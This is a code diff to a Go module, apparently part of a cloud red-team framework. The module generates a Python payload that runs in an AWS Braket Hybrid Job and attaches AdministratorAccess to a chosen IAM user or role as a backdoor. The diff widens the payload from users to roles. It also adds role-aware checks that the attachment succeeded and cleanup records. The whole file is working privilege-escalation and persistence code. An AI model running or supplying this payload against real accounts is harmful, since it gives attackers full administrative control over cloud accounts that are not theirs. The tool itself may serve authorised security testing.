@@ -16,8 +16,8 @@ import (
 )
 
 // BackdoorAttachPolicyPayload generates a Python script that attaches
-// AdministratorAccess (or a custom policy) to a specified IAM user when run
-// inside a Braket Hybrid Job container. Parameters are read from environment
+// AdministratorAccess (or a custom policy) to a specified IAM user or role when
+// run inside a Braket Hybrid Job container. Parameters are read from environment
 // variables, which Braket populates from the job's HyperParameters map.
 type BackdoorAttachPolicyPayload struct{}
 
@@ -30,7 +30,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach AdministratorAccess policy to an existing IAM user via Braket Hybrid Job"
+	return "Attach AdministratorAccess policy to an existing IAM user or role via Braket Hybrid Job"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -44,8 +44,8 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_USER",
-			Description: "IAM username to attach the policy to (auto-resolved from caller identity if unset)",
+			Name:        "TARGET_ARN",
+			Description: "IAM user or role name/ARN to attach the policy to (auto-resolved from caller identity if unset)",
 			Required:    true,
 		},
 		{
@@ -58,17 +58,18 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 }
 
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_USER"] == "" {
-		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
+	if options["TARGET_ARN"] == "" {
+		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
 	}
 	return nil
 }
 
 // GenerateCode produces a standalone Python script for Braket Hybrid Job execution.
 // Parameters are passed as Braket HyperParameters and read from os.environ inside
-// the container — Braket injects hyper-parameter key/value pairs as environment variables.
+// the container. The script auto-detects whether TARGET_ARN refers to a user or role
+// and calls the appropriate IAM attach API at runtime.
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -79,15 +80,30 @@ import os
 
 # Parameters are injected by Braket as environment variables from HyperParameters.
 # Defaults fall back to the values baked in at code-generation time.
-target_user = os.environ.get("TARGET_USER", %q)
+target_arn = os.environ.get("TARGET_ARN", %q)
 policy_arn = os.environ.get("POLICY_ARN", %q)
 
 
-def main():
+def attach_policy(target_arn, policy_arn):
+    """Attach policy to an IAM user or role, detected from the ARN."""
     iam = boto3.client("iam")
+    if ":role/" in target_arn or ":assumed-role/" in target_arn:
+        # Extract role name from ARN: arn:aws:iam::ACCOUNT:role/NAME
+        # or arn:aws:sts::ACCOUNT:assumed-role/NAME/SESSION
+        parts = target_arn.split("/")
+        role_name = parts[-2] if ":assumed-role/" in target_arn else parts[-1]
+        iam.attach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
+        print(f"Successfully attached {policy_arn} to role {role_name}")
+    else:
+        # User ARN (arn:aws:iam::ACCOUNT:user/NAME) or plain username
+        user_name = target_arn.split("/")[-1] if "/" in target_arn else target_arn
+        iam.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)
+        print(f"Successfully attached {policy_arn} to user {user_name}")
+
+
+def main():
     try:
-        iam.attach_user_policy(UserName=target_user, PolicyArn=policy_arn)
-        print(f"Successfully attached {policy_arn} to user {target_user}")
+        attach_policy(target_arn, policy_arn)
     except Exception as e:
         print(f"Error attaching policy: {e}")
         raise
@@ -95,7 +111,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-`, targetUser, policyArn)
+`, targetARN, policyArn)
 
 	return code, nil
 }
@@ -106,28 +122,45 @@ func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, erro
 	return result, nil
 }
 
-// VerifySuccess checks whether the target user has the expected policy attached.
+// VerifySuccess checks whether the target principal has the expected policy attached.
 func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	if targetUser == "" {
-		return false, fmt.Errorf("TARGET_USER not set; cannot verify")
+	if targetARN == "" {
+		return false, fmt.Errorf("TARGET_ARN not set; cannot verify")
 	}
 
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
 	iamClient := iam.NewFromConfig(config)
-	result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
-		UserName: aws.String(targetUser),
-	})
-	if err != nil {
-		return false, nil
-	}
-	for _, policy := range result.AttachedPolicies {
-		if aws.ToString(policy.PolicyArn) == policyArn {
-			return true, nil
+
+	switch principalType {
+	case "role":
+		result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
+			RoleName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
+		}
+	default:
+		result, err := iamClient.ListAttachedUserPolicies(ctx, &iam.ListAttachedUserPoliciesInput{
+			UserName: aws.String(principalName),
+		})
+		if err != nil {
+			return false, nil
+		}
+		for _, policy := range result.AttachedPolicies {
+			if aws.ToString(policy.PolicyArn) == policyArn {
+				return true, nil
+			}
 		}
 	}
 	return false, nil
@@ -136,7 +169,7 @@ func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config 
 // ReportSideEffects returns the policy attachment as a tracked modification so the
 // workspace cleanup system can reverse it.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	targetUser := options["TARGET_USER"]
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -147,17 +180,24 @@ func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]strin
 		policyName = policyArn[idx+1:]
 	}
 
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
 	return []modules.CreatedResource{
 		{
 			Type:          "iam:attached-policy",
-			Name:          fmt.Sprintf("%s←%s", targetUser, policyName),
+			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
 			ARN:           policyArn,
-			CleanupMethod: "iam:DetachUserPolicy",
+			CleanupMethod: cleanupMethod,
 			Metadata: map[string]string{
-				"principal_type": "user",
-				"principal_name": targetUser,
+				"principal_type": principalType,
+				"principal_name": principalName,
 				"policy_arn":     policyArn,
 			},
 		},
 	}
 }
+
